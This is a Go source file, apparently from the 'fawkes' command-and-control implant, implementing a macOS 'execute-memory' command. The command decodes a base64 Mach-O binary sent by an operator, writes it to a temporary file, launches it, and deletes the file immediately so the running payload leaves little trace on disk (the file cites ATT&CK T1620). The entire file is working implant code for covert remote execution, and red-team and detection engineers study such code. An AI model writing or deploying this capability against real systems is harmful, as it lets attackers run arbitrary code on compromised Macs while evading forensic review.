//go:build darwin

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// executeMemoryArgs is shared with execute_memory_linux.go (duplicated due to build tags).
type executeMemoryArgs struct {
	BinaryB64 string `json:"binary_b64"` // base64-encoded binary
	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
}

// ExecuteMemoryCommand executes a Mach-O binary with minimal disk footprint.
// Uses a temp file that is unlinked immediately after process start.
type ExecuteMemoryCommand struct{}

func (c *ExecuteMemoryCommand) Name() string { return "execute-memory" }
func (c *ExecuteMemoryCommand) Description() string {
	return "Execute a Mach-O binary with minimal disk footprint — temp file is removed immediately after launch (T1620)"
}

func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: binary_b64 parameter required (base64-encoded Mach-O binary)")
	}

	var args executeMemoryArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.BinaryB64 == "" {
		return errorResult("Error: binary_b64 is empty")
	}

	binaryData, err := base64.StdEncoding.DecodeString(args.BinaryB64)
	if err != nil {
		return errorf("Error decoding binary: %v", err)
	}

	if len(binaryData) < 4 {
		return errorResult("Error: binary data too small to be valid")
	}

	if !isValidMachO(binaryData) {
		return errorResult("Error: not a valid Mach-O binary (unrecognized magic header)")
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 60
	}

	// Create temp file — use system temp dir (usually /private/var/folders/.../T/)
	tmpFile, err := os.CreateTemp("", "")
	if err != nil {
		return errorf("Error creating temp file: %v", err)
	}
	tmpPath := tmpFile.Name()

	// Write the binary
	if _, err := tmpFile.Write(binaryData); err != nil {
		tmpFile.Close()
		os.Remove(tmpPath)
		return errorf("Error writing binary: %v", err)
	}
	tmpFile.Close()

	// Make executable
	if err := os.Chmod(tmpPath, 0700); err != nil {
		os.Remove(tmpPath)
		return errorf("Error setting executable permission: %v", err)
	}

	// Parse command-line arguments
	var cmdArgs []string
	if args.Arguments != "" {
		cmdArgs = strings.Fields(args.Arguments)
	}

	// Execute with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, tmpPath, cmdArgs...)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Start the process, then immediately remove the file from disk.
	// The kernel keeps the file data accessible via the open file descriptor
	// until the process exits, but it's no longer visible in the filesystem.
	startErr := cmd.Start()
	os.Remove(tmpPath) // Remove regardless of start success

	if startErr != nil {
		return errorf("Error starting binary: %v", startErr)
	}

	waitErr := cmd.Wait()

	// Build output from stdout + stderr
	var sb strings.Builder
	if stdout.Len() > 0 {
		sb.WriteString(stdout.String())
	}
	if stderr.Len() > 0 {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString("[stderr] ")
		sb.WriteString(stderr.String())
	}

	if waitErr != nil {
		if ctx.Err() == context.DeadlineExceeded {
			sb.WriteString(fmt.Sprintf("\n[Process timed out after %ds]", timeout))
		}
		output := sb.String()
		if output == "" {
			output = fmt.Sprintf("Error executing binary: %v", waitErr)
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "error",
			Completed: true,
		}
	}

	output := sb.String()
	if output == "" {
		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// isValidMachO checks for valid Mach-O magic bytes.
func isValidMachO(data []byte) bool {
	if len(data) < 4 {
		return false
	}
	magic := [4]byte{data[0], data[1], data[2], data[3]}
	switch magic {
	case [4]byte{0xCF, 0xFA, 0xED, 0xFE}: // MH_MAGIC_64 (64-bit LE)
		return true
	case [4]byte{0xCE, 0xFA, 0xED, 0xFE}: // MH_MAGIC (32-bit LE)
		return true
	case [4]byte{0xFE, 0xED, 0xFA, 0xCF}: // MH_CIGAM_64 (64-bit BE)
		return true
	case [4]byte{0xFE, 0xED, 0xFA, 0xCE}: // MH_CIGAM (32-bit BE)
		return true
	case [4]byte{0xCA, 0xFE, 0xBA, 0xBE}: // FAT_MAGIC (universal binary)
		return true
	case [4]byte{0xBE, 0xBA, 0xFE, 0xCA}: // FAT_CIGAM (universal binary, reversed)
		return true
	}
	return false
}
